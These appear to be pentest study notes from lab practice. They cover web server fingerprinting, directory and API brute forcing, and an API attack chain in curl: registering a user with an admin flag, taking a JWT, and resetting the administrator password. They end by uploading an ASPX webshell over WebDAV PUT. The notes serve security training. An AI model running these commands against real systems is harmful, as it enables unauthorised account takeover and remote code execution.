## Fingerprinting Web Servers with Nmap

#### Running Nmap scan to discover web server version
```Shell
nmap -p80  -sV 192.168.50.20
```

#### Running Nmap NSE http enumeration script against the target
```Shell
nmap -p80 --script=http-enum 192.168.50.20
```

## Directory Brute Force with Gobuster

#### Running Gobuster
```Shell
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```
Specify the target IP using the -u parameter and a wordlist with -w. The default running threads are 10; you can reduce the amount of traffic by setting a lower number via the -t parameter.
#### Running Gobuster to find file extensions
```Shell
gobuster dir -u 'https://streamio.htb/admin/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -x php -k
```
`-x` for extension type; `-k` specifies https
## Web Application Enumeration

### Debugging Page Content

#### Using Developer Tools to Inspect JavaScript Sources
![[Pasted image 20230501140636.png]]
Notice that the application uses jQuery2 version 3.6.0, a common JavaScript library

#### Pretty Print Source

### Inspecting HTTP Response Headers and Sitemaps

#### Using the Network Tool to View Requests
![[Pasted image 20230501150600.png]]

#### Viewing Response Headers in the Network Tool
![[Pasted image 20230501150741.png]]
The Server header displayed above will often reveal at least the name of the web server software. In many default configurations, it also reveals the version number.

*HTTP headers are not always generated solely by the web server. For instance, web proxies actively insert the X-Forwarded-For2 header to signal the web server about the original client IP address. You should know about this from the HTB Box "Union."*

Historically, headers that started with "X-" were called non-standard HTTP headers. However, RFC66483 now deprecates the use of "X-" in favor of a clearer naming convention.

Some examples of non-standard headers include X-Powered-By, x-amz-cf-id, and X-Aspnet-Version. Further research into these names could reveal additional information, such as that the "x-amz-cf-id" header indicates the application uses Amazon CloudFront.

#### Sitemap Crawling and Robots.txt
```Shell
curl https://www.google.com/robots.txt
```
Allow and Disallow are directives for web crawlers indicating pages or directories that "polite" web crawlers may or may not access

### Enumerating and Abusing APIs

#### API Path Naming Convention
```Shell
/api_name/v1
```

#### Creating a pattern file for API brute forcing with gobuster
```.txt
{GOBUSTER}/v1
{GOBUSTER}/v2
```
This is using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number.

#### Bruteforcing API Paths
```Shell
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
You call this feature by using the -p option and providing a file with patterns. This example provided a `/users/v1` path

#### Obtaining Users' Information
```Shell
curl -i http://192.168.50.16:5002/users/v1
```

#### Discovering extra APIs
```Shell
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```
The example included the `/password` path

#### Check if the login method is supported by extending our base URL
```Shell
curl -i http://192.168.50.16:5002/users/v1/login
```
Although we were presented with a 404 NOT FOUND message, the status message states that the user has not been found; another clear sign that the API itself exists

#### Crafting a POST request against the login API
```Shell
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
The API return message shows that the authentication failed, meaning that the API parameters are correctly formed

#### Attempting new User Registration
```Shell
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
```
The API replied with a fail message stating that we should also include an email address.

#### Attempting to register a new user as admin
```Shell
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```
Since we received no error, it seems we were able to successfully register a new user as an admin, which should not be permitted by design.

#### Logging in as an admin user
```Shell
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
We were able to correctly sign in and retrieve a JWT authentication token.

#### Attempting to Change the Administrator Password via a POST request
```Shell
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```
We passed the JWT key inside the Authorization header along with the new password

#### Attempting to Change the Administrator Password via a PUT request
```Shell
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

#### Successfully logging in as the admin account
```Shell
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

#### Sending the request to Burp
```Shell
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login --proxy 127.0.0.1:8080
```

#### Crafting a POST request in Burp for API testing
![[Pasted image 20230501161251.png]]

#### Inspecting the API response value
![[Pasted image 20230501161309.png]]

#### Using the Site Map to organize API testing
![[Pasted image 20230501161343.png]]
Once we've tested a number of different APIs, we could navigate to the Target tab and then Site map. We can then retrieve the entire map of the paths we have been testing so far.

## Additional Techniques from PG Practice
### Using cadaver to take advantage of a web server that allows PUT
```Shell
cadaver 192.168.205.122
```
*Will prompt for username and password*
#### Uploading a webshell using cadaver
```dav
put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
```
